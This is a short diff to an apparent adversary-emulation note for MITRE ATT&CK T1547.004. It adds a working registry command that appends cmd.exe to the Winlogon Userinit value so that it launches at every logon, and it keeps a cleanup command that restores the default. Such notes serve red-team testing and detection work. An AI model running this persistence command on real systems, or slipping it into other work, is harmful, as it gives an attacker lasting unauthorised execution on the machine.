@@ -1,12 +1,11 @@
-
 Boot or Logon Autostart Execution: Winlogon Helper DLL T1547.004
 
 
+CMD
+----------------------------------------------------
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,C:\Windows\System32\cmd.exe" /f
+
 
 CLEANUP
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe" /f
-
-
-
-https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/
+----------------------------------------------------
